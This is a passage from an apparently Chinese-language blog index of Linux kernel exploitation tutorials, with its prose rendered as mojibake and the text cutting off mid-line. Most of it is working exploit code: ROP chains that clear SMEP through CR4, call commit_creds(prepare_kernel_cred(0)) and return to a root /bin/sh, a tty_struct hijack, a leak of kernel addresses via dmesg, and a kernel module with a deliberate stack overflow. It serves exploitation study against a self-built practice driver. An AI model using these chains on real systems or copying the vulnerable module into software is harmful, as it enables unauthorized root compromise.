pop_rax_rbx_r12_r13_rbp_ret = vmBase + 0x46c45e;\n    unsigned long movCr4Rdi_pop_rbp_ret = vmBase + 0x004c40;\n    unsigned long movRspRax_decEbx_ret = vmBase + 0x805115;\n    unsigned long swapgs_sysret = (unsigned long)vmBase + 0x60ba2;\n    unsigned long swapgs_popRbp_ret = (unsigned long)vmBase + 0x60394;\n    unsigned long iretq = (unsigned long)vmBase + 0x803857;\n    unsigned long getR = (unsigned long)getroot;\n    unsigned long sh = (unsigned long)shell;\n    unsigned long sp;\n    size_t rop[32];\n    \n    commit_creds        = (commit_creds_t)(vmBase + 0x9f4a0);\n    prepare_kernel_cred = (prepare_kernel_cred_t)(vmBase + 0x9f870);\n\n\n    // unsigned long vmBase = memOffset - smpOffset;\n    // unsigned long pop_rdi_ret = vmBase + 0xFE3542;\n    \n    // unsigned long pop_rax_rbx_r12_rbp_ret = vmBase + 0x3794b9;\n    // unsigned long movCr4Rax_pop_rbp_ret = vmBase + 0xe0e4;\n    // unsigned long movRspRax_decEbx_ret = vmBase + 0x8841CF;\n    // unsigned long getR = (unsigned long)getroot;\n    // unsigned long swapgs_ret = (unsigned long)vmBase + 0x884188;\n    // unsigned long iretq = (unsigned long)vmBase + 0x882d77;\n    // unsigned long sh = (unsigned long)shell;\n    \n    //print part\n    printf(\"pop_rdi_ret:0x%llx\\n\",pop_rdi_ret);\n    printf(\"movCr4Rdi_pop_rbp_ret:0x%llx\\n\",movCr4Rdi_pop_rbp_ret);\n    printf(\"movRspRax_decEbx_ret:0x%llx\\n\",movRspRax_decEbx_ret);\n    printf(\"iretq:0x%llx\\n\",iretq);\n    \n    //open Dev\n    char* pos = \"/dev/stack\";\n    fd = openDev(pos);\n    char ttyBuf[tty_size] = {'0'};\n    addChunk.len = tty_size;\n    addChunk.data = ttyBuf;\n    addFun(fd,&addChunk);\n\n\n    void* fake_tty_operations[30];\n    for(int i = 0; i < 30; i++)\n    {\n        fake_tty_operations[i] = movRspRax_decEbx_ret;\n    }\n    fake_tty_operations[0] = pop_rax_rbx_r12_r13_rbp_ret;\n    fake_tty_operations[1] = (size_t)rop;\n    \n    size_t fake_tty_struct[4] = {0};\n    fake_tty_struct[0] = 0x0000000100005401;//need to set magic number\n    fake_tty_struct[1] = 0;\n    fake_tty_struct[2] = 0;\n    fake_tty_struct[3] = (size_t)fake_tty_operations;\n\n\n\n    editChunk.idx = 0;\n    editChunk.len = 0x20;\n    editChunk.data = fake_tty_struct;\n    \n    freeFun(fd,&editChunk);\n    \n    pos = \"/dev/ptmx\";\n    fd_tty = openDev(pos);\n    printf(\"fd_tty:0x%d\\n\",fd_tty);\n    editFun(fd, &editChunk);\n\n\n    //rop set\n    save_state();\n    rop[i++] = pop_rdi_ret;      // pop_rax_rbx_r12_rbp_ret\n    rop[i++] = 0x6f0;\n    rop[i++] = movCr4Rdi_pop_rbp_ret;      // mov cr4, rax; pop rbp; ret;\n    rop[i++] = 0;\n    rop[i++] = (size_t)getR;\n    rop[i++] = swapgs_popRbp_ret;      // swapgs;ret\n    rop[i++] = 0x0;\n    rop[i++] = iretq;      // iretq\n    rop[i++] = (size_t)sh;\n    rop[i++] = user_cs;                /* saved CS */\n    rop[i++] = user_rflags;            /* saved EFLAGS */\n    rop[i++] = user_sp;\n    rop[i++] = user_ss;\n    \n    write(fd_tty,buf,0x10);\n    \n    return 0;\n\n}\n\n\nint openDev(char* pos){\n    int fd;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((fd = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return fd;\n}\n\nvoid addFun(int fd, struct addNote* arg)\n{\n    ioctl(fd,1,arg);\n}\n\nvoid freeFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,888,arg);\n}\n\nvoid editFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,3,arg);\n}\n\nvoid readFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,4,arg);\n}\n\n\nvoid save_state() {\n   __asm__(\"mov %cs,user_cs;\"\n           \"mov %ss,user_ss;\"\n           \"mov %rsp,user_sp;\"\n           \"pushf;\"\n           \"pop user_rflags;\"\n           );\n  puts(\"user states have been saved!!\");\n}\n\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\n\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nunsigned long findAddr() {\n\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n    \n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n    \n    printf(\"[+] Find usefull addr...\\n\");\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n    \n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n    \n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n    \n    return addr;\n\n}\n```\n\n## æ‰§è¡Œæµç¨‹\n\nè¿™é‡Œè¿˜å¾—è¯´ä¸€ä¸‹æ‰§è¡Œæµç¨‹ï¼Œæ¯”è¾ƒä¸å¥½è°ƒè¯•\n\nå³å…ˆæ˜¯ä¾æ®writeå‡½æ•°è·³è½¬åˆ°æˆ‘ä»¬æœ€å¼€å§‹è®¾ç½®çš„gadgetï¼Œä¹Ÿå°±æ˜¯movRspRax_decEbx_retï¼Œç„¶åå°†æ ˆåŠ«æŒä¸ºfake_tty_operationsã€‚ä¹‹åå†è·³è½¬åˆ°pop_rax_rbx_r12_r13_rbp_retï¼Œå°†ROPèµ‹å€¼ç»™raxï¼Œå†retåˆ°\n\nmovRspRax_decEbx_retï¼Œå†å°†æ ˆåŠ«æŒä¸ºROPï¼Œä¹‹åå°±retåˆ°ROPé“¾æ¡ä¸­çš„pop_rdi_retäº†ï¼Œä¹‹åæ‰§è¡Œæµå¯æ§ã€‚\n\n\n\n# â–²æ³¨æ„äº‹é¡¹ï¼š\n\nswapgs;retæ²¡æœ‰æ—¶ï¼Œå¯ä»¥ç”¨åŠ ä¸Špopçš„ï¼Œåªè¦æœ€åretåˆ°iretqå³å¯ã€‚åŒæ ·çš„gadgetå¯ä»¥ç›¸äº’è½¬æ¢ã€‚\n\niretqç±»ä¼¼äºretï¼Œç›´æ¥ä¸€ä¸ªæŒ‡ä»¤å³å¯ã€‚\n\nå¯„å­˜å™¨ä¿å­˜éœ€è¦åœ¨è¿›å…¥å†…æ ¸ä¹‹å‰ã€‚\n\nå †å—ç”³è¯·æ—¶çš„è§„åˆ™éœ€è¦æ˜¯`GFP_KERNEL`æ‰è¡Œï¼Œè‡³å°‘`GFP_DMA`ä¸è¡Œã€‚\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"pwnKernelä»0å¼€å§‹(äºŒ)","url":"/2021/09/06/Kernelä»0å¼€å§‹(äºŒ)/","content":"\n\n\n# å‰è¨€\n\nå…ˆå°è¯•ä¸‹æœ€ç®€å•çš„æ ˆæº¢å‡ºï¼Œä¿æŠ¤å’Œæœªè¢«ä¿æŠ¤çš„æƒ…å†µ\n\nç»™å‡ºè‡ªå·±è®¾è®¡çš„æ ˆæº¢å‡ºé¢˜ç›®ï¼š\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡\nstatic char *buffer_var;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t stack_dev_no;\n\n\nstatic ssize_t stack_read(struct file *filp, char __user *buf, size_t count,\n        loff_t *f_pos);\n\nstatic ssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos);\n\nstatic long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\n// static int stack_open(struct inode *i, struct file *f)\n// {\n//   printk(KERN_INFO \"[i] Module vuln: open()\\n\");\n//   return 0;\n// }\n\n// static int stack_close(struct inode *i, struct file *f)\n// {\n//   printk(KERN_INFO \"[i] Module vuln: close()\\n\");\n//   return 0;\n// }\n\nstatic struct file_operations stack_fops =\n        {\n                .owner = THIS_MODULE,\n                // .open = stack_open,\n                // .release = stack_close,\n                .write = stack_write,\n                .read = stack_read\n        };\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°\nstatic int __init stack_init(void)\n{\n    buffer_var=kmalloc(100,GFP_DMA);\n    printk(KERN_INFO \"[i] Module stack registered\");\n    if (alloc_chrdev_region(&stack_dev_no, 0, 1, \"stack\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, stack_dev_no, NULL, \"stack\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module stack error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &stack_fops);\n    if (cdev_add(&cdev, stack_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, stack_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(stack_dev_no), MINOR(stack_dev_no));\n    return 0;\n\n}\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°\nstatic void __exit stack_exit(void)\n{\n    // é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·\n    unregister_chrdev_region(stack_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n// è¯»è®¾å¤‡\nssize_t stack_read(struct file *filp, char __user *buf, size_t count,\n        loff_t *f_pos)\n{\n    printk(KERN_INFO \"Stack_read function\" );\n    if(strlen(buffer_var)>0) {\n        printk(KERN_INFO \"[i] Module vuln read: %s\\n\", buffer_var);\n        kfree(buffer_var);\n        buffer_var=kmalloc(100,GFP_DMA);\n        return 0;\n    } else {\n        return 1;\n    }\n}\n\n// å†™è®¾å¤‡\nssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos)\n{\n    printk(KERN_INFO \"Stack_write function\" );\n    char buffer[100]={0};\n    if (_copy_from_user(buffer, buf, len))\n        return -EFAULT;\n    buffer[len-1]='\\0';\n    printk(\"[i] Module stack write: %s\\n\", buffer);\n    strncpy(buffer_var,buffer,len);\n    return len;\n}\n\n\n\n// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶\nlong stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    switch (cmd) {\n        case 1:\n            break;\n        case 2:\n            break;\n        default:\n            // ä¸æ”¯æŒçš„å‘½ä»¤\n            return -ENOTTY;\n    }\n    return 0;\n}\n\n\nmodule_init(stack_init);\nmodule_exit(stack_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n\n\n\n\n# â–²å¯»æ‰¾gadget\n\n## `ropper`\n\n```bash\nropper --file vmlinux --search \"pop|ret\"\n```\n\nè¿™ä¸ªæ¯”è¾ƒæ…¢ï¼Œå®åœ¨ä¸æ¨è\n\n## `objdump`\n\n```bash\nobjdump -d vmlinux -M intel | grep -E 'ret|pop'\n```\n\nè¿™ä¸ªæ¯”è¾ƒå¿«ï¼Œä¸è¿‡æŸ¥å‡ºæ¥çš„gadgetå¯èƒ½æ˜¯ä¸è¿ç»­çš„ï¼Œéœ€è¦ä»”ç»†è¾¨åˆ«ä¸€ä¸‹ï¼Œå¿…è¦æ—¶è¿˜éœ€è¦Gdbè°ƒè¯•è¿›å…¥vmlinuxä¸­è¿›è¡Œæ±‡ç¼–æŸ¥è¯¢ã€‚æ¯”å¦‚æŸ¥å‡ºæ¥çš„ç±»ä¼¼å¦‚ä¸‹\n\n![image-20210930111201257](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930111208.png)\n\nå¯ä»¥çœ‹åˆ°`pop rax`ä¸‹å¹¶æ²¡æœ‰`ret`ï¼Œä½†æ˜¯ä¾ç„¶æŸ¥æ‰¾å‡ºæ¥äº†ï¼Œå…¶ä¸­`pop rax`å’Œ`pop rbx`ä¸æ˜¯è¿åœ¨ä¸€èµ·çš„ï¼Œç”¨çš„æ—¶å€™æ³¨æ„è¾¨åˆ«ã€‚\n\n## `ROPgadget`\n\nä¾ç„¶å¯ä»¥ç”¨ï¼Œä½†æœ‰æ—¶å€™å¯èƒ½æ¯”è¾ƒæ…¢ï¼Œå¯ä»¥å…ˆä¿å­˜ä¸‹æ¥ï¼Œç„¶åå†æ‰¾ï¼š\n\n```bash\nROPgadget --binary vmlinux | grep \"pop rdx ; ret\"\n```\n\n## ä¸€é”®è·å–\n\nè¯¦è§ä¹‹å‰çš„é¡¹ç›®ä¸­çš„`getKernelROP`å‘½ä»¤ï¼Œå¸¸ç”¨gadgetï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½ç”¨çš„\n\n[PIG-007/kernelAll (github.com)](https://github.com/PIG-007/kernelAll)\n\n[PIG-007/kernelAll (gitee.com)](https://gitee.com/Piggy007/kernelAll)\n\n# ä¸€ã€Stackè¢«ä¿æŠ¤\n\nè¿™é‡Œçš„è¢«ä¿æŠ¤æŒ‡çš„æ˜¯å¼€å¯äº†SMEPï¼Œç±»ä¼¼äºNXçš„æ ˆä¿æŠ¤ï¼Œå³å†…æ ¸æ— æ³•æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ã€‚\n\n## æ–¹æ³•ä¸€ï¼š\n\né€šè¿‡ROPæ¥å…³é—­æ‰smepä¿æŠ¤ï¼Œè¿™æ ·å°±å¯ä»¥è¿›å…¥å†…æ ¸ä¹‹åå¯åŠ¨ç”¨æˆ·ç©ºé—´æˆ‘ä»¬è‡ªå·±æ„é€ çš„`commit_creds(prepare_kernel_cred(0))`æ¥å®Œæˆææƒï¼Œä¹‹åå†å¯ä¸€ä¸ªshellå³å¯è·å¾—ææƒä¹‹åçš„shellã€‚\n\n## 1.è·å–åœ°å€\n\nç”±äºreadå‡½æ•°ä¸å¤ªæœ‰ä»€ä¹ˆåœ°å€çš„è¯»å–ï¼Œæ‰€ä»¥è¿™é‡Œåˆ©ç”¨dmesgæ¥è·å–åœ°å€\n\n```c\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n    \n    /* execute dmesg and place result in a file */\n\tprintf(\"[+] Excecute dmesg...\\n\");\n\tsystem(\"dmesg > /tmp/dmesg\");\n\t/* find: Freeing SMP alternatives memory*/\n\tprintf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n    return addr;\n}\n\n//mainå‡½æ•°ä¸­\nunsigned long memOffset;\nmemOffset = findAddr();\nunsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;\nunsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;\nunsigned long getR = (unsigned long)getroot;\nunsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\nunsigned long iretq = (unsigned long)memOffset-0x7AC289;\nunsigned long sh = (unsigned long)shell;\n```\n\ndmesgæ˜¯è·å–å†…æ ¸å¯åŠ¨çš„æ—¥å¿—ç›¸å…³ä¿¡æ¯ï¼Œè‡ªå·±å»å°è¯•ä¸€ä¸‹çŸ¥é“ã€‚\n\n![image-20210930112655023](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930112655.png)\n\n## 2.å…³é—­SMEP\n\n```c\nunsigned char payload[300] = {0};\nunsigned char *p           = payload;\n\n/* pop rax;rbx;r12;rbp;ret;*/\nunsigned long poprax = (unsigned long)memOffset-0xCB5B47;\nmemcpy(p,&poprax,8);\nprintf(\"    pop rax      at 0x%lx\\n\", poprax);\np+=8;\nmemcpy(p,\"\\xf0\\x06\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* SMEP OFF rax*/\np+=8;\nmemcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* rbx*/\np+=8;\nmemcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* r12 */\np+=8;\nmemcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\np+=8;\n\n/* mov cr4, rax;rbp;ret     */\nunsigned long movcr4 = (unsigned long)memOffset-0x01020F1C;\nmemcpy(p,&movcr4,8);\nprintf(\"    mov CR4, RAX at 0x%lx\\n\", movcr4);\np+=8;\nmemcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\np+=8;\n```\n\n## 3.ææƒ\n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\n/* getroot                        */\nmemcpy(p,&getR,8);\np+=8;\n```\n\n## 4.è¿”å›ç”¨æˆ·ç©ºé—´èµ·Shell\n\n```c\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n```\n\n\n\n```c\n/* swapgs;ret           */\nprintf(\"    swapgs       at 0x%lx\\n\", swapgs);\nmemcpy(p,&swapgs,8);\np+=8;\n\n/* iretq                          */\nprintf(\"    iretq        at 0x%lx\\n\", iretq);\nmemcpy(p,&iretq,8);\np+=8;\n\n/* shell                          */\nmemcpy(p,&sh,8);\np+=8;\n```\n\n## 5.è®¾ç½®å¯„å­˜å™¨ä¿å­˜å’Œæ¢å¤\n\nè¿›å…¥å†…æ ¸ç©ºé—´ROPé“¾å‰éœ€è¦ä¿å­˜ç¯å¢ƒï¼Œä»å†…æ ¸ç¯å¢ƒå›åˆ°ç”¨æˆ·ç©ºé—´èµ·shellä¹‹å‰éœ€è¦æ¢å¤ç¯å¢ƒã€‚\n\n### (1)ä¿å­˜ç¯å¢ƒ\n\n```c\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\n\nstatic void save_state() {\n  asm(\n  \"movq %%cs, %0\\n\"\n  \"movq %%ss, %1\\n\"\n  \"pushfq\\n\"\n  \"popq %2\\n\"\n  : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n```\n\nè¿™ä¸ª`save_state`å‡½æ•°åœ¨å¤åˆ¶æ•°æ®é€šè¿‡`stack_write`å‡½æ•°æ ˆæº¢å‡ºè¿›è¡ŒROPä¹‹å‰éœ€è¦è°ƒç”¨ä¿å­˜ç”¨æˆ·ç©ºé—´çš„ç¯å¢ƒã€‚\n\n### (2)æ¢å¤ç¯å¢ƒ\n\n```c\n/* user_cs                        */\nmemcpy(p,&user_cs,8);\np+=8;\n\n/* user_rflags                    */\nmemcpy(p,&user_rflags,8);\np+=8;\n\n/*stack of userspace   \t\t\t  */         \nregister unsigned long rsp asm(\"rsp\");\nunsigned long sp = (unsigned long)rsp;\nmemcpy(p,&sp,8);\np+=8;\n\n/* user_ss                        */\nmemcpy(p,&user_ss,8);\n```\n\nè¿™ä¸ªéƒ½æ˜¯æ”¾åœ¨ROPé“¾ä¸­ï¼Œæ”¾åœ¨shellä¹‹åã€‚\n\n### poc\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\nstruct cred;\nstruct task_struct;\ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\nprepare_kernel_cred_t   prepare_kernel_cred;\ncommit_creds_t    commit_creds;\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long stack;\n\n\nunsigned long findAddr();\nstatic void save_state();\nvoid getroot (void);\nvoid shell(void);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    unsigned char payload[300] = {0};\n    unsigned char *p           = payload;\n    unsigned long memOffset;\n\n\n\n    memOffset = findAddr();\n    unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;\n    unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;\n    unsigned long getR = (unsigned long)getroot;\n    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\n    unsigned long iretq = (unsigned long)memOffset-0x7AC289;\n    unsigned long sh = (unsigned long)shell;\n\n    printf(\"    addr[0x%llx]\\n\", memOffset);\n\n    /* set value for commit_creds and prepare_kernel_cred */\n    commit_creds        = (commit_creds_t)(memOffset - 0xfbf6a0);\n    prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xfbf2e0);\n\n\n    /* open fd on /dev/vuln \t\t\t\t\t\t\t*/\n    printf(\"[+] Open vuln device...\\n\");\n    if ((fd = open(\"/dev/stack\", O_RDWR)) < 0) {\n        printf(\"    Can't open device file: /dev/stack\\n\");\n        exit(1);\n    }\n\n\n    /* payload                          */\n    printf(\"[+] Construct the payload...\\n\");\n    save_state();\n    /* offset before RIP                    */\n    memcpy(p,\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",116);\n    p+=116;\n\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* for rbp */\n    p+=8;\n\n    /* pop rax;rbx;r12;rbp;ret                    */\n    memcpy(p,&pop_rax_rbx_r12_rbp_ret,8);\n    printf(\"    pop rax      at 0x%lx\\n\", pop_rax_rbx_r12_rbp_ret);\n    p+=8;\n    memcpy(p,\"\\xf0\\x06\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* SMEP OFF */\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* rbx*/\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* r12 */\n    p+=8;\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\n    p+=8;\n\n    /* mov cr4, rax;rbp;ret     */\n    memcpy(p,&movCr4Rax_pop_rbp,8);\n    printf(\"    mov CR4, RAX at 0x%lx\\n\", movCr4Rax_pop_rbp);\n    p+=8;\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\n    p+=8;\n\n    /* getroot                        */\n    memcpy(p,&getR,8);\n    p+=8;\n\n    /* swapgs;ret           */\n    printf(\"    swapgs       at 0x%lx\\n\", swapgs);\n    memcpy(p,&swapgs,8);\n    p+=8;\n\n    /* iretq                          */\n    printf(\"    iretq        at 0x%lx\\n\", iretq);\n    memcpy(p,&iretq,8);\n    p+=8;\n\n\n    /*\n\tthe stack should look like this after an iretq call\n\t  RIP\n\t  CS\n\t  EFLAGS\n\t  RSP\n\t  SS\n\t*/\n\n\n    /* shell                          */\n    memcpy(p,&sh,8);\n    p+=8;\n\n    /* user_cs                        */\n    memcpy(p,&user_cs,8);\n    p+=8;\n    /* user_rflags                    */\n    memcpy(p,&user_rflags,8);\n    p+=8;\n    /*stack of userspace   \t\t\t  */         \n    register unsigned long rsp asm(\"rsp\");\n    unsigned long sp = (unsigned long)rsp;\n    memcpy(p,&sp,8);\n    p+=8;\n    /* user_ss                        */\n    memcpy(p,&user_ss,8);\n\n    /* trig the vuln                  */\n    printf(\"[+] Trig the vulnerablity...\\n\");\n    write(fd, payload, 300);\n\n\n    return 0;\n\n}\n\n\n\n\n\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n\n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n\n    /* find: Freeing SMP alternatives memory    */\n    printf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n\n    return addr;\n}\n\nstatic void save_state() {\n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n\n\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n\n/* function to get root id */\nvoid getroot (void)\n{\n    commit_creds(prepare_kernel_cred(0));\n}\n```\n\n\n\n## æ–¹æ³•äºŒï¼š\n\nç›´æ¥åœ¨å†…æ ¸ç©ºé—´åˆ©ç”¨åœ°å€å’Œgadgetæ„é€ `commit_creds(prepare_kernel_cred(0))`æ¥å®Œæˆææƒï¼Œä¹‹åè¿”å›ç”¨æˆ·ç©ºé—´èµ·shellã€‚\n\n### 1.ROPé“¾\n\n```\npop rdi;ret\n0\nprepare_kernel_cred_k\npop rdx;rbx;rbp;ret\npop rbp;ret\n0\nrbp_data\nmov rdi,rax;call rdx\ncommit_creds_k\nswapgs;ret\niretq \n```\n\nä¹‹åå°±æ˜¯è¿”å›ç”¨æˆ·ç©ºé—´èµ·shelläº†\n\n### 2.è§£ææ‰§è¡Œæµç¨‹\n\nâ–²å…ˆæ˜¯è°ƒç”¨`prepare_kernel_cred_k(0)`ï¼Œç„¶åé€šè¿‡å°†`pop rbp;ret`èµ‹å€¼ç»™rdxï¼Œä¹‹å`mov rdi,rax`ï¼Œç„¶åcall rdxï¼Œå³è°ƒç”¨`pop rbp;ret`ï¼Œä¹‹åretå³å¯å›åˆ°`commit_creds_k`ã€‚\n\nè¿™é‡Œè¾ƒä¸ºéº»çƒ¦çš„åŸå› æ˜¯å› ä¸º`mov rdi,rax;call rdx`è¿™ä¸ªè¯­å¥ï¼Œéœ€è¦èµ‹å€¼rdiæ‰èƒ½è¿›è¡Œ`commit_creds`å‡½æ•°çš„æ‰§è¡Œï¼Œå³å°†`prepare_kernel_cred_k(0)`è¿”å›å€¼ç»™`commit_creds`å‡½æ•°ã€‚\n\n![Snipaste_2021-09-30_19-56-10](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200208.png)\n\nèµ‹å€¼\n\n![Snipaste_2021-09-30_19-57-47](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200230.png)\n\nä¹‹ååˆå› ä¸ºå­˜åœ¨callè¿™ä¸ªè¯­å¥ï¼Œæ‰€ä»¥å¤šäº†`pop rbp;ret`æ¥å°†æ ˆå¹³è¡¡æ‰ï¼Œï¼Œä»è€Œèƒ½å¤Ÿç›´æ¥retåˆ°commit_creds\n\n![Snipaste_2021-09-30_20-03-46](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200353.png)\n\nåŒæ ·ha1vkå¸ˆå‚…çš„åˆ©ç”¨jmpå°±æ¯”è¾ƒç®€å•ï¼Œä¸è¿‡å…·ä½“çœ‹gadgetï¼Œæœ‰æ—¶å€™å¾ˆéš¾æ‰¾ã€‚\n\n### poc\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long stack;\n\n\nunsigned long findAddr();\nstatic void save_state();\nvoid shell(void);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    unsigned char payload[300] = {0};\n    unsigned char *p           = payload;\n    unsigned long memOffset;\n\n\n\n    memOffset = findAddr();\n    unsigned long pop_rdi_ret = memOffset - 0xD17AF3;\n    unsigned long pop_rdx_rbx_rbp_ret = (unsigned long)memOffset-0xCB43CD;\n    unsigned long pop_rbp_ret = memOffset - 0xCB43CB;\n    unsigned long movRdiRax_call_rdx = (unsigned 